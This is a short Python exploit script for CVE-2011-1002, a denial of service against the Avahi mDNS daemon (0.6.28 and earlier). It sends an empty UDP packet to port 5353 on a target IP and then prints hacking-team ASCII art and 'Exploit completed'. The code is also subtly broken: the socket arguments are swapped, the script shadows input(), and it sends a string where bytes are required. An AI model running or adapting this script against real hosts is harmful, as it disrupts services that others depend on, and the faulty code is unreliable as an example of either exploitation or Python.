# #!/usr/bin/env python
#Exploit Title: Avahi 0.6.28 Denial of Service Vulnerability
#Date: 3/3/2011
#Author: MaYaSeVeN
#Blog: http://mayaseven.blogspot.com
#Video : [PoC] http://www.youtube.com/user/mayaseven
# Version: avahi <= 0.6.28
# Tested on: Debian 6(Squeeze)&Ubuntu 10.10
# CVE : CVE-2011-1002
import socket,sys

Target_IP = input(f'Enter target IP [192.168.2.79]: ')
if len(sys.argv) != 2:
    print(f'Usage : avahi_DoS.py {Target_IP}')
    sys.exit(1)
    
input = sys.argv[1]
sock = socket.socket(socket.SOCK_DGRAM,socket.AF_INET)
sock.sendto('',(input,5353))

print(f'  ,--^----------,--------,-----,-------^--,;')
print(f"  | |||||||||   `--------'     |          O    ... CWH Underground Hacking Team ..")
print(f"  `+---------------------------^----------|                        By MaYaSeVeN")
print(f"    `\_,-------, _________________________|    [!] Thanks: c1ph3r")
print(f"      / XXXXXX /`|     /")
print(f"     / XXXXXX /  `\   /")
print(f"    / XXXXXX /\______(")
print(f"   / XXXXXX /    ")
print(f"  / XXXXXX /")
print(f" (________(")
print(f"  `------'")
print(f"Exploit completed")